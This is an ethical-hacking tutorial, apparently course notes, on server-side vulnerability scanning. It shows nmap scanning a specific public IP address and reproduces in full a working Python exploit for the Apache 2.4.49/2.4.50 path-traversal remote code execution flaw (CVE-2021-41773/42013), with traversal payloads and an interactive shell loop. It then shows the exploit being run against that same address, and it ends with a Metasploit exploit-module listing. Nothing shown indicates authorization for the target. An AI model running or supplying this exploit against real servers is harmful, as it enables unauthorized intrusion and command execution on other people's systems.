# Server side
Ethical Hacking- vulnerability scanning

## Tools
<hr>

* Skipfish
* Owasp Disrbuster
* Webslayer
* Nmap
* Nessus

### The first scanner we will use
Nmap
<hr>
to see the services running, launch nmap.

```bash
nmap -sV 145.14.145.161
```
output
```
Starting Nmap 7.91 ( https://nmap.org ) at 2024-07-04 22:50 WAT
Nmap scan report for 145.14.145.161
Host is up (0.28s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE   VERSION
21/tcp  open  ftp?
80/tcp  open  http      awex
443/tcp open  ssl/https awex
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```
You can retrieve the services that are running or go directly to retrieve them from the database.
<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>
<br><br>
<img src="side.png" width="100%">

Service:`http`

<img src="side1.png" width="100%">

* Download the python file exploit

<img src="side2.png" width="100%">

* Look the python file

```python
# Exploit Title: Apache HTTP Server 2.4.50 - Remote Code Execution (RCE) (3)
# Date: 11/11/2021
# Exploit Author: Valentin Lobstein
# Vendor Homepage: https://apache.org/
# Version: Apache 2.4.49/2.4.50 (CGI enabled)
# Tested on: Debian GNU/Linux
# CVE : CVE-2021-41773 / CVE-2021-42013
# Credits : Lucas Schnell


#!/usr/bin/env python3
#coding: utf-8

import os
import re
import sys
import time
import requests
from colorama import Fore,Style


header = '''\033[1;91m
    
     ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████ 
    ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
    ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
    ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
    ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
    ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
    ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░ 
''' + Style.RESET_ALL


if len(sys.argv) < 2 :
    print( 'Use: python3 file.py ip:port ' )
    sys.exit()

def end():
    print("\t\033[1;91m[!] Bye bye !")
    time.sleep(0.5)
    sys.exit(1)

def commands(url,command,session):
    directory = mute_command(url,'pwd')
    user = mute_command(url,'whoami')
    hostname = mute_command(url,'hostname')
    advise = print(Fore.YELLOW + 'Reverse shell is advised (This isn\'t an interactive shell)')
    command = input(f"{Fore.RED}╭─{Fore.GREEN + user}@{hostname}: {Fore.BLUE + directory}\n{Fore.RED}╰─{Fore.YELLOW}$ {Style.RESET_ALL}")    
    command = f"echo; {command};"
    req = requests.Request('POST', url=url, data=command)
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    output = response.text
    print(output)
    if 'clear' in command:
        os.system('/usr/bin/clear')
        print(header)
    if 'exit' in command:
        end()

def mute_command(url,command):
    session = requests.Session()
    req = requests.Request('POST', url=url, data=f"echo; {command}")
    prepare = req.prepare()
    prepare.url = url  
    response = session.send(prepare, timeout=5)
    return response.text.strip()


def exploitRCE(payload):
    s = requests.Session()
    try:
        host = sys.argv[1]
        if 'http' not in host:
            url = 'http://'+ host + payload
        else:
            url = host + payload 
        session = requests.Session()
        command = "echo; id"
        req = requests.Request('POST', url=url, data=command)
        prepare = req.prepare()
        prepare.url = url  
        response = session.send(prepare, timeout=5)
        output = response.text
        if "uid" in output:
            choice = "Y"
            print( Fore.GREEN + '\n[!] Target %s is vulnerable !!!' % host)
            print("[!] Sortie:\n\n" + Fore.YELLOW + output )
            choice = input(Fore.CYAN + "[?] Do you want to exploit this RCE ? (Y/n) : ")
            if choice.lower() in ['','y','yes']:
                while True:
                    commands(url,command,session)  
            else:
                end()       
        else :
            print(Fore.RED + '\nTarget %s isn\'t vulnerable' % host)
    except KeyboardInterrupt:
        end()

def main():
    try:
        apache2449_payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash'
        apache2450_payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash'
        payloads = [apache2449_payload,apache2450_payload]
        choice = len(payloads) + 1
        print(header)
        print("\033[1;37m[0] Apache 2.4.49 RCE\n[1] Apache 2.4.50 RCE")
        while choice >= len(payloads) and choice >= 0:
            choice = int(input('[~] Choice : '))
            if choice < len(payloads):
                exploitRCE(payloads[choice])
    except KeyboardInterrupt:
            print("\n\033[1;91m[!] Bye bye !")
            time.sleep(0.5)
            sys.exit(1)

if __name__ == '__main__':
    main()
            
```
## Let's to run file
```bash
python3 Explot.py
```
Use: `python3 file.py ip:port`

```bash
python3 Explot.py 145.14.145.161:80
```
## Use metasploit to exploit
<hr>

run `msfconsole` in your terminal
```bash
sudo msfconsole
```
```bash
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.5-dev                           ]
+ -- --=[ 2296 exploits - 1202 auxiliary - 410 post       ]
+ -- --=[ 962 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the 
save command, future console restarts will use this 
environment again
Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```
```bash
msf6> search exploit
```
```bash
Matching Modules
================

   #     Name                                                                               Disclosure Date  Rank       Check  Description
   -     ----                                                                               ---------------  ----       -----  -----------
   0     auxiliary/dos/http/cable_haunt_websocket_dos                                       2020-01-07       normal     No     "Cablehaunt" Cable Modem WebSocket DoS
   1     exploit/windows/ftp/32bitftp_list_reply                                            2010-10-12       good       No     32bit FTP Client Stack Buffer Overflow
   2     exploit/windows/tftp/threectftpsvc_long_mode                                       2006-11-27       great      No     3CTftpSvc TFTP Long Mode Buffer Overflow
   3     exploit/windows/ftp/3cdaemon_ftp_user                                              2005-01-04       average    Yes    3Com 3CDaemon 2.0 FTP Username Overflow
   4     exploit/windows/scada/igss9_misc                                                   2011-03-24       excellent  No     7-Technologies IGSS 9 Data Server/Collector Packet Handling Vulnerabilities
   5     exploit/windows/scada/igss9_igssdataserver_rename                                  2011-03-24       normal     No     7-Technologies IGSS 9 IGSSdataServer .RMS Rename Buffer Overflow
   6     exploit/windows/scada/igss9_igssdataserver_listall                                 2011-03-24       good       No     7-Technologies IGSS IGSSdataServer.exe Stack Buffer Overflow
   7     exploit/windows/fileformat/a_pdf_wav_to_mp3                                        2010-08-17       normal     No     A-PDF WAV to MP3 v1.0.0 Buffer Overflow
   8     auxiliary/scanner/http/a10networks_ax_directory_traversal                          2014-01-28       normal     No     A10 Networks AX Loadbalancer Directory Traversal
   9     exploit/windows/ftp/aasync_list_reply                                              2010-10-12       good       No     AASync v2.2.1.0 (Win32) Stack Buffer Overflow (LIST)
   10    exploit/windows/scada/abb_wserver_exec                                             2013-04-05       excellent  Yes    ABB MicroSCADA wserver.exe Remote Code Execution
   11    exploit/windows/fileformat/abbs_amp_lst                                            2013-06-30       normal     No     ABBS Audio Media Player .LST Buffer Overflow
   12    exploit/linux/local/abrt_raceabrt_priv_esc                                         2015-04-14       excellent  Yes    ABRT raceabrt Privilege Escalation
   13    exploit/linux/local/abrt_sosreport_priv_esc                                        2015-11-23       excellent  Yes    ABRT sosreport Privilege Escalation
   14    exploit/windows/fileformat/acdsee_fotoslate_string                                 2011-09-12       good       No     ACDSee FotoSlate PLP File id Parameter Overflow
   15    exploit/windows/fileformat/acdsee_xpm                                              2007-11-23       good       No     ACDSee XPM File Section Buffer Overflow
   16    exploit/linux/local/af_packet_chocobo_root_priv_esc                                2016-08-12       good       Yes    AF_PACKET chocobo_root Privilege Escalation
   17    exploit/linux/local/af_packet_packet_set_ring_priv_esc                             2017-03-29       good       Yes    AF_PACKET packet_set_ring Privilege Escalation
   18    exploit/windows/sip/aim_triton_cseq                                                2006-07-10       great      No     AIM Triton 1.0.4 CSeq Buffer Overflow
   19    exploit/windows/misc/ais_esel_server_rce                                           2019-03-27       excellent  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
   20    exploit/aix/rpc_cmsd_opcode21                                                      2009-10-07       great      No     AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
   21    exploit/windows/misc/allmediaserver_bof                                            2012-07-04       normal     No     ALLMediaServer 0.8 Buffer Overflow
   22    exploit/windows/fileformat/allplayer_m3u_bof                                       2013-10-09       normal     No     ALLPlayer M3U Buffer Overflow
   23    exploit/windows/fileformat/aol_phobos_bof                                          2010-01-20       average    No     AOL 9.5 Phobos.Playlist Import() Stack-based Buffer Overflow
   24    exploit/windows/fileformat/aol_desktop_linktag                                     2011-01-31       normal     No     AOL Desktop 9.6 RTX Buffer Overflow
   25    exploit/windows/browser/aim_goaway                                                 2004-08-09       great      No     AOL Instant Messenger goaway Overflow
   26    exploit/windows/browser/aol_ampx_convertfile                                       2009-05-19       normal     No     AOL Radio AmpX ActiveX Control ConvertFile() Buffer Overflow
   27    exploit/linux/local/apt_package_manager_persistence                                1999-03-09       excellent  No     APT Package Manager Persistence
   28    exploit/windows/browser/asus_net4switch_ipswcom                                    2012-02-17       normal     No     ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow
   29    exploit/linux/misc/asus_infosvr_auth_bypass_exec                                   2015-01-04       excellent  No     ASUS infosvr Auth Bypass Command Execution
   30    exploit/linux/http/atutor_filemanager_traversal                                    2016-03-01       excellent  Yes    ATutor 2.2.1 Directory Traversal / Remote Code Execution
   31    exploit/multi/http/atutor_sqli                                                     2016-03-01       excellent  Yes    ATutor 2.2.1 SQL Injection / Remote Code Execution
   32    exploit/multi/http/atutor_upload_traversal                                         2019-05-17       excellent  Yes    ATutor 2.2.4 - Directory Traversal / Remote Code Execution,
   33    exploit/unix/webapp/awstatstotals_multisort                                        2008-08-26       excellent  Yes    AWStats Totals multisort Remote Command Execution
   34    exploit/unix/webapp/awstats_configdir_exec                                         2005-01-15       excellent  Yes    AWStats configdir Remote Command Execution
   35    exploit/unix/webapp/awstats_migrate_exec                              
   ```